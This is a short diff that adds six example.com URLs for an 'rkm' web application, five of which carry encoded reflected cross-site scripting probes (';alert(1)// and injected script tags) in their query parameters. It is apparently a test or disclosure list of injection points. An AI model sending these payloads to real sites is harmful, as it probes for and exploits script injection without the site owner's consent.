@@ -1,0 +1,6 @@
+https://www.example.com/rkm/external.jsp?doc=&#039;%3balert(1)//&amp;user=Self+Help
+https://www.example.com/rkm/search.jsp?user=Self+Help&amp;startDate=\&#039;%3balert(1)//
+https://www.example.com/rkm/usersettings.jsp?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+https://www.example.com/rkm/viewdoc.jsp?doc=&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;user=Self%20Help
+https://www.example.com/rkm/AttachmentServlet?=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+https://www.example.com/rkm/index.jsp?user=Self%20Help
